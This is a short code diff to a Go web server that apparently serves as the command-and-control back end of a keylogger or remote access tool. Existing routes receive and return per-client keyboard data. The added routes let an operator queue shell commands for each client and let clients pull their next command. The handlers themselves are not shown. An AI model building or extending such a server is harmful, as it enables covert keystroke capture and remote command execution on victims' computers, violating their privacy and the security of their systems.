@@ -43,6 +43,14 @@ func main() {
 	
 	router.POST("/post_kbdata", utils.AddClientKeyboardData)
 	router.GET("/get_kbdata/:client_addr", utils.GetClientKeyboardData)
+
+	/* ! shell */
+	router.POST("/shell/enque/:client_addr", utils.EnqueueShellCommand)
+	router.POST("/shell/deque/:client_addr", utils.DequeueShellCommand)
+	router.POST("/shell/update_head", utils.UpdateHeadShellCommand)
+	router.GET("/shell/get_head_admin/:client_addr", utils.PullHeadShellCommand)
+	router.GET("/shell/get_head_client", utils.PullHeadShellCommandC)
+	router.POST("/shell/clear/:client_addr", utils.ClearClientCommandQueue)
 	
 	log.Println("Server started!")
 	router.Run(fmt.Sprintf(":%d", PORT));
